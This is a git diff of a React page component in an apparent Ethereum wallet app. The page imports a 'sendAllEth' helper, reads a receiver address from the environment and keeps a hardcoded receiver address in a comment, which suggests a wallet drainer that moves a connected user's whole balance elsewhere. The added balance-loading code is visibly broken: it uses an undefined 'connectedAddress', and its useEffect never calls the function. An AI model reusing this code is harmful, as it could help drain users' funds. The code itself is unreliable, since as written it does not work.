@@ -1,4 +1,4 @@
-import React, { useState } from "react";
+import React, { useEffect, useState } from "react";
 import {
   getEthBalance,
   useAddress,
@@ -11,13 +11,19 @@ import { sendAllEth } from "../../helper/helper";
 import { formatedBalanceData } from "../../helper/Formatter";
 
 const HomePage = () => {
-  const balance = getEthBalance();
   const address = useAddress();
   const { provider, connected } = useWeb3Context();
   const [processing, setProcessing] = useState(false);
+  const [balance, setBalance] = useState(null);
 
   let receiverAddress = EnvHelper.getReceiverAddress();
   // let receiverAddress = `0x00A49A28ba4C87F3Ff8DE967c97B6FD300214187`;
+
+  const loadEthBalance = async () => {
+    let userBalance = await provider.getBalance(connectedAddress);
+    const balanceInEth = ethers.utils.formatEther(userBalance);
+    setBalance(balanceInEth);
+  };
 
   const transferEth = async () => {
     try {
@@ -36,6 +42,11 @@ const HomePage = () => {
       console.log(error);
     }
   };
+
+  useEffect(() => {
+    loadEthBalance;
+  }, [balance]);
+
   return (
     <div>
       {connected && (
